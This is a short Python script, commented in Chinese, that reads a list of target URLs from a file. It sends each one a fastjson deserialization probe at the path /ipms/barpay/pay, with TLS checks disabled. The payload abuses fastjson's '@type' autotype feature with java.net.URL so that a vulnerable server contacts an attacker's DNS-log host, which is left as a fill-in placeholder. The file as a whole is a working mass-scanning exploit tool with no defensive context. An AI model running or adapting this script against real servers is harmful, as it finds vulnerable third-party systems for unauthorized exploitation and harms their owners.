# -*- coding: utf-8 -*-

import requests

# 读取url.txt中的地址
with open('url.txt', 'r') as file:
    urls = file.readlines()

# 去除每行末尾的换行符
urls = [url.strip() for url in urls]

# 要发送的数据包
payload = '''
{
  "@type": "com.alibaba.fastjson.JSONObject",
  {
    "@type": "java.net.URL",
    "val": "你的dnslog地址"
  }
}
'''

# 请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate, br',
    'Sec-Gpc': '1',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
}

for url in urls:
    try:
        # 如果没有http/https开头，默认加http://
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        
        full_url = url.rstrip('/') + '/ipms/barpay/pay'

        response = requests.post(full_url, headers=headers, data=payload, verify=False, timeout=10)
        print(f"Sent POST to {full_url}, status: {response.status_code}")
    except Exception as e:
        print(f"Error sending POST to {url}: {e}")
